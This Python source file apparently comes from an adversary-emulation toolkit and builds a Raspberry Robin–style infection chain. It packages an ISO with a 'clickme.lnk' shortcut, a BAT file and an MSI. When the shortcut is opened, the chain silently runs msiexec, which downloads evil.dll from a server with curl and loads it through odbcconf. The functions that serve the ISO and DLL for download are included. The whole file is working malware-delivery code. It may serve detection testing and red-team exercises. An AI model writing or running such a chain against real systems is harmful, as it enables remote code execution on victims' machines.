from typing import List

from make.lnk.lnk import makeLnk
from make.zip.zip import makeZip
from make.bat.bat import *
from make.rar.rar import makeRar
from make.msi.msi import *
from make.powershell.powershell import *
from make.iso.iso import makeIso
from make.cmd.cmd import *

from helpers import *
from model import AceFile, AceRoute


def raspberryrobin(baseUrl) -> List[AceRoute]:
    routes = []
    # LNK -> CMD -> BAT -> MSIEXEC:CMD: (downloadDLL -> odbcconf/rundll32:dll)

    # DLL: Payload
    evilDll: AceBytes = readFileContent('payloads/evil.dll')
    evilDllroute = AceRoute('/evil.dll', evilDll)
    routes.append(evilDllroute)

    # MSI: stage 2
    cmd = "cmd /c \"{} & {}\"".format(
        makeCmdFileDownloadWithCurl(
            url=baseUrl + '/evil.dll', 
            destinationFile='%tmp%\\evil.dll'),
        makeCmdToDllWithOdbc(
            dllPath='%tmp%\\evil.dll'
        ),
    )
    logger.info("Stage 2 cmdline: " + cmd)
    msi = makeMsiFromCmd(cmd)
    msiFile = AceFile("evil.msi", msi)

    # BAT: stage 1: make sure each line ends with \r\n, or it will not work
    bat = AceBytes(b"msiexec.exe /q /i evil.msi\r\n")
    batFile = makeAceFile('evil.bat', bat)

    # LNK cmd using "/r cmd <file.bat" technique
    # file.bat is in the same directory as the lnk (iso)
    lnkData: AceBytes = makeLnk(
        name = "clickme.lnk",
        target = "c:\\windows\\system32\\cmd.exe",
        arguments = "/r cmd < evil.bat".format(),
    )
    lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)

    # ISO: LNK entry point, stage 1 bat, stage 2 msi
    container: AceBytes = makeIso(files = [
        batFile,
        lnkFile,
        msiFile,
    ])
    containerFile: AceFile = makeAceFile('test.iso', container)
    isoRoute: AceRoute = AceRoute('/test.iso', container, download=True, downloadName='test.iso')
    routes.append(isoRoute)

    return routes
    

